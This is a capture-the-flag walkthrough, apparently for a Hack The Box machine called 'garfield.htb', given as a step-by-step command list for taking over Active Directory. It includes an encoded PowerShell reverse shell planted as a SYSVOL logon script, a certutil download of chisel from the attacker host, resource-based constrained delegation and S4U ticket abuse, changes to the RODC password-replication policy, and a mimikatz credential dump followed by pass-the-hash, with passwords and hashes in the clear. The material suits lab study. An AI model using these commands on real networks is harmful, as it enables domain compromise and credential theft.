@@ -1,0 +1,118 @@
+BloodHound Path Analysis
+
+j.arbuckle is denied WinRM access. WinRM is restricted to Remote Management Users (SID 580), which includes l.wilson and l.wilson_adm.
+
+l.wilson holds ForceChangePassword permissions over l.wilson_adm.
+
+l.wilson_adm belongs to TIER 1 (SID 3108).
+
+TIER 1 holds AddSelf privileges to RODC ADMINISTRATORS (SID 2101).
+
+l.wilson_adm holds ForceChangePassword and WriteAccountRestrictions on the domain controller RODC01.
+
+Objective: Acquire credentials for l.wilson to initiate the cascade.
+
+
+C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
+73e4718b4dd9e79ecbb0987c58ca0f23
+
+Full command reference in order:
+Phase 1 — Enumeration
+bashbloodhound-python -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -ns 10.129.4.88 -d garfield.htb -c all
+smbmap -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb -H 10.129.4.88 -R
+Phase 2 — Logon script abuse → l.wilson shell
+bash# Assign logon script to l.wilson
+bloodyAD --host garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v printerDetect.bat
+
+# Generate payload
+YOUR_IP="10.10.16.28"
+PS_CMD="\$client = New-Object System.Net.Sockets.TCPClient('$YOUR_IP',4444);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
+ENCODED=$(echo -n "$PS_CMD" | iconv -t UTF-16LE | base64 -w 0)
+cat > printerDetect.bat << EOF
+@echo off
+powershell -nop -w hidden -enc $ENCODED
+EOF
+
+# Upload
+smbclient //10.129.4.88/SYSVOL -U 'garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978' -c 'cd garfield.htb/scripts; put printerDetect.bat'
+
+# Listener
+nc -lvnp 4444
+Phase 3 — ForceChangePassword → l.wilson_adm
+powershell# From l.wilson reverse shell
+net user l.wilson_adm NewPass123! /domain
+bashevil-winrm -i 10.129.4.88 -u l.wilson_adm -p 'NewPass123!'
+Phase 4 — AddSelf → RODC ADMINISTRATORS
+powershellAdd-ADGroupMember -Identity "RODC Administrators" -Members l.wilson_adm
+Phase 5 — RBCD on RODC01
+bash# Create fake computer
+addcomputer.py -computer-name 'FAKEMACHINE$' -computer-pass 'FakePass123!' -dc-ip 10.129.4.88 'garfield.htb/l.wilson_adm:NewPass123!'
+powershell# Set RBCD
+$fake = Get-ADComputer -Identity "FAKEMACHINE"
+Set-ADComputer -Identity (Get-ADComputer -Identity "RODC01") -PrincipalsAllowedToDelegateToAccount $fake
+Phase 6 — S4U2Proxy ticket + chisel tunnel
+bash# GetST
+impacket-getST garfield.htb/'FAKEMACHINE$:FakePass123!' -spn cifs/RODC01.garfield.htb -impersonate Administrator -dc-ip 10.129.4.88
+export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
+
+# Chisel server
+./chisel server -p 9999 --reverse
+powershell# Chisel client (from evil-winrm)
+certutil -urlcache -split -f http://10.10.16.28:8001/chisel.exe C:\Windows\Temp\chisel.exe
+C:\Windows\Temp\chisel.exe client 10.10.16.28:9999 R:socks
+bash# wmiexec through tunnel
+proxychains impacket-wmiexec -k -no-pass -target-ip 192.168.100.2 garfield.htb/Administrator@RODC01.garfield.htb
+Phase 7 — Modify RODC replication policy
+bash# Remove Administrators from NeverReveal
+bloodyAD --host 10.129.4.88 -d garfield.htb -u l.wilson_adm -p 'NewPass123!' set object 'CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb' msDS-NeverRevealGroup -v 'CN=Account Operators,CN=Builtin,DC=garfield,DC=htb' -v 'CN=Server Operators,CN=Builtin,DC=garfield,DC=htb' -v 'CN=Backup Operators,CN=Builtin,DC=garfield,DC=htb'
+
+# Add Administrator to RevealOnDemand
+bloodyAD --host 10.129.4.88 -d garfield.htb -u l.wilson_adm -p 'NewPass123!' set object 'CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb' msDS-RevealOnDemandGroup -v 'CN=Administrator,CN=Users,DC=garfield,DC=htb'
+cmd# Force replication (from RODC01 wmiexec shell)
+repadmin /rodcpwdrepl RODC01 DC01 "CN=Administrator,CN=Users,DC=garfield,DC=htb"
+
+Phase 8 — Dump hash via mimikatz
+bash# Upload mimikatz to SYSVOL scripts
+smbclient //10.129.4.88/SYSVOL -U 'garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978' -c 'cd garfield.htb/scripts; put /home/grim/htb_challenges/garfield/x64/mimikatz.exe mimikatz.exe'
+cmd# From RODC01 wmiexec shell
+copy \\DC01\SYSVOL\garfield.htb\scripts\mimikatz.exe C:\Windows\Temp\mimikatz.exe
+C:\Windows\Temp\mimikatz.exe "privilege::debug" "lsadump::lsa /patch /name:Administrator" exit
+# Result: ee238f6debc752010428f20875b092d5
+
+Phase 9 — DA shell on DC01
+bashevil-winrm -i 10.129.4.88 -u Administrator -H ee238f6debc752010428f20875b092d5
+powershelltype C:\Users\Administrator\Desktop\root.txt
+type C:\Users\l.wilson_adm\Desktop\user.txt
+
+
+```1. After getting the l.wilson_adm shell ,AddSelf → RODC ADMINISTRATORS
+Add-ADGroupMember -Identity "RODC Administrators" -Members l.wilson_adm
+2. RBCD on RODC01
+# Create fake computer
+addcomputer.py -computer-name 'FAKEMACHINE$' -computer-pass 'FakePass123!' -dc-ip 10.129.4.88 'garfield.htb/l.wilson_adm:NewPass123!'
+# Set RBCD
+$fake = Get-ADComputer -Identity "FAKEMACHINE"
+Set-ADComputer -Identity (Get-ADComputer -Identity "RODC01") -PrincipalsAllowedToDelegateToAccount $fake
+3. S4U2Proxy ticket + chisel tunnel
+# GetST
+impacket-getST garfield.htb/'FAKEMACHINE$:FakePass123!' -spn cifs/RODC01.garfield.htb -impersonate Administrator -dc-ip 10.129.4.88
+export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
+# Chisel server
+./chisel server -p 9999 --reverse
+# Chisel client (from evil-winrm)
+C:\Windows\Temp\chisel.exe client {{redacted}}:9999 R:socks
+# wmiexec through tunnel
+proxychains impacket-wmiexec -k -no-pass -target-ip 192.168.100.2 garfield.htb/Administrator@RODC01.garfield.htb
+4. Modify RODC replication policy
+# Remove Administrators from NeverReveal
+bloodyAD --host 10.129.4.88 -d garfield.htb -u l.wilson_adm -p 'NewPass123!' set object 'CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb' msDS-NeverRevealGroup -v 'CN=Account Operators,CN=Builtin,DC=garfield,DC=htb' -v 'CN=Server Operators,CN=Builtin,DC=garfield,DC=htb' -v 'CN=Backup Operators,CN=Builtin,DC=garfield,DC=htb'
+# Add Administrator to RevealOnDemand
+bloodyAD --host 10.129.4.88 -d garfield.htb -u l.wilson_adm -p 'NewPass123!' set object 'CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb' msDS-RevealOnDemandGroup -v 'CN=Administrator,CN=Users,DC=garfield,DC=htb'
+# Force replication (from RODC01 wmiexec shell)
+repadmin /rodcpwdrepl RODC01 DC01 "CN=Administrator,CN=Users,DC=garfield,DC=htb"
+5.  Dump hash via mimikatz
+# From RODC01 wmiexec shell
+C:\Windows\Temp\mimikatz.exe "privilege::debug" "lsadump::lsa /patch /name:Administrator" exit
+# Result: Administrator_hash
+6. DA shell on DC01
+evil-winrm -i 10.129.4.88 -u Administrator -H  Administrator_hash```
